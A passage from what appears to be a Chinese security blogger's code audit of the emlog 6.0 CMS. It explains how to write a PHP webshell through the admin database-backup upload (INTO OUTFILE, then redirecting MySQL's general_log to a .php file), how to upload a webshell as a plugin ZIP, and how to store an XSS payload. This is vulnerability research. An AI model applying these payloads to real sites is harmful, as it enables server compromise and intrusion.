+<h3 id="3-通过后台数据库备份上传webshell"><a href="#3-通过后台数据库备份上传webshell" class="headerlink" title="3.通过后台数据库备份上传webshell"></a>3.通过后台数据库备份上传webshell</h3><p>对于在<code>/emlog/init.php</code> 中的变量 <code>$action</code>，当我们通过GET方式传入<code>$action[]</code>数组的形式，会出现语法错误报错导致的网站路径泄露，可以考虑结合sql注入写入webshell</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/20.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>在<code>/admin/data.php</code>中发现了可以进行本地数据库备份，并可以上传数据库备份文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/14.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>那么就可以考虑加入语句</p>
+<p><code>SELECT &quot;&lt;?php phpinfo(); ?&gt;&quot; INTO outfile &quot;E:\php\PHPTutorial\WWW\emlog\shell.php&quot;;</code>如果网站数据库的配置<code>secure_file_priv</code>为空，那么我们就可以直接在网站根目录下写入webshell</p>
+<p>我们先随意备份一个数据库文件，然后加入上述语句，上传</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/15.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>结果出现了报错信息<code>The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</code>说明数据库配置<code>secure_file_priv</code>为null，并且我们无法通过SQL语句改变该配置值，在数据库中验证<code>show global variables like &#39;%secure%&#39;;</code></p>
+<p>所以我们考虑另一种方法，通过设置SQL日志的方式，首先需要保证<code>general_log=on</code>，再修改<code>general_log_file</code>的日志写入文件绝对路径</p>
+<p>在数据库文件中加入语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL general_log = &apos;on&apos;;</span><br><span class="line">SET GLOBAL general_log_file = &apos;E:/php/PHPTutorial/WWW/emlog/shell.php&apos;;</span><br><span class="line">SELECT &apos;&lt;?php phpinfo(); ?&gt;&apos;;</span><br></pre></td></tr></table></figure>
+<p>然后上传</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/16.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>可以看出显示了上传成功</p>
+<p>然后我们可以看到在网站的根目录下出现了<code>shell.php</code>即我们上传的webshell，它实际上是一个日志文件，只不过我们加入了可执行的Php代码</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/17.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/18.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>访问</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/19.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h3 id="4-通过上传ZIP文件上传webshell"><a href="#4-通过上传ZIP文件上传webshell" class="headerlink" title="4.通过上传ZIP文件上传webshell"></a>4.通过上传ZIP文件上传webshell</h3><p><code>/admin/plugin.php</code>页面可以上传一个zip压缩包，并在后台将压缩包解压成文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/21.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>跟踪<code>emUnZip()</code>函数，在<code>/include/lib/function.base.php</code>下：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/23.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>图中有我自己添加的测试代码，用来测试<code>ZipArchive</code>类的<code>getNameIndex</code>和<code>getFromName</code>函数的输出值</p>
+<p>我们试着上传一个test.zip，压缩包中包含demo文件夹，demo文件夹下包含demo.php文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/24.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>可以看出这里<code>getNameIndex()</code>函数返回结果是压缩包下的文件夹名即<code>demo/</code>，在768行中<code>$dir . $plugin_name . &#39;.php&#39;</code>拼接的结果是<code>demo/demo.php</code>即压缩包下的目录内容，从响应包结果来看是上传成功的</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/25.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>所以猜出<code>getFromName</code>函数应该是判断压缩包下的文件目录如果与传入的参数一致，则返回true，所以可以看出我们上传的文件夹名必须和文件名是相同的，后面即可解压压缩包，上传webshell</p>
+<p>如果我们上传的压缩包只包含一个php文件，可以看一下测试的响应结果：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/26.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>那么<code>$dir . $plugin_name . &#39;.php&#39;</code>拼接的结果是<code>demo.php/demo.php.php</code>，从响应结果<code>Location: ./plugin.php?error_e=1</code>来看很明显是上传失败，返回-1，说明是<code>$re == false</code>导致的，即<code>getFromName</code>函数判断压缩包不存在该目录</p>
+<h3 id="5-存储型XSS"><a href="#5-存储型XSS" class="headerlink" title="5.存储型XSS"></a>5.存储型XSS</h3><p><code>/admin/write_log.php</code>添加文章存在html代码形式，尝试直接添加<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/27.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>添加后访问网站首页出现弹框</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/28.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>抓包分析</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/29.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>跟踪到<code>/admin/save_log.php</code>文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/30.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p><code>$content</code>变量只有经过转义处理，还是过滤不当引起的xss</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该CMS较小，代码简洁易懂，大部分的漏洞，由于全局不存在输入过滤，所以通过全局搜索POST，GET数据发现的，还是那句话，输入过滤不够，导致的漏洞</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-03-26T12:04:38.899Z" itemprop="dateUpdated">2019-03-26 20:04:38</time>
+</span>
+
+
+        
+        原文链接：<a href="/posts/15210/" target="_blank" rel="external">https://Foxgrin.github.io/posts/15210/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='https://Foxgrin.github.io'">
+            <img src="/img/touxiang/1.jpg" alt="Somnus">
+            <a>Somnus</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/15210/&title=《代码审计--emlog6.0》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/15210/&title=《代码审计--emlog6.0》 — Somnus's blog&source=记录emlog6.0审计过程以及漏洞分析" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/15210/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《代码审计--emlog6.0》 — Somnus's blog&url=https://Foxgrin.github.io/posts/15210/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/15210/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/posts/45634/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：上海&#34;嘉伟思杯&#34;ctf
+        </h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/posts/5451/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：代码审计--74cms3.0">下一篇：代码审计--74cms3.0</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2018
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="https://Foxgrin.github.io">Somnus</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+
+        <span class="license">This blog is licensed under a <a rel="license" rel="external nofollow" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/weixin.png" data-alipay="/img/zhifubao.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/15210/&title=《代码审计--emlog6.0》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/15210/&title=《代码审计--emlog6.0》 — Somnus's blog&source=记录emlog6.0审计过程以及漏洞分析" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/15210/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《代码审计--emlog6.0》 — Somnus's blog&url=https://Foxgrin.github.io/posts/15210/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/15210/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABx0lEQVR42u3aQW7DMAwEwPz/0+m1h9pakpbgAqOTkSbV2AdC5Przidf317r65P6b99cPL1xc3DH3e7vyba5+e79LbsDFxT3Pvdr+6vp+s0mxW9hwcXFfzO2BesURFxf3zdykAC0OKMHjwMXFfQ83b06SzapN1JZeDRcXd8DNp5T7rrfMd3FxcVvcb3HltzQfkv7xK1xc3CPcXpRSjV2f+isuLu4ZbtKcXEF3HJgWn+Di4h7kVn/WG1vkg5LFiQwXF3czN395ovrCxHwYiouL+wZudcyRlL95ANPMhHFxcQfc/AWLaulJ2qTyiAQXF/cgtzf6nIxE81HLIvnBxcXdzJ0HJL0mKh+a4OLinuE+1fwkx6D80SyKIy4u7hFuNdKYxyfVxxTltLi4uBu4eRvTC1AnByNcXNzz3CQOyW8jD1fyKGVxIsPFxd3GrUan1RurlsVClcXFxX2U+y2uSaQ6L2q4uLhnuL3JQ+9f58Vx0obh4uI+xe0FpcmWk2C18HoWLi7uNm5+HOmVoWrtxMXF/V/cSXCSFNCFDRcX98XceYGrFjVcXNzz3GrzM/lmdWz6QK+Gi4tb5FZLSTV0yQtcfvTBxcXdxv0B79PYV1ZwYosAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2018/7/9");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "Somnus");
+
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+</body>
+</html>
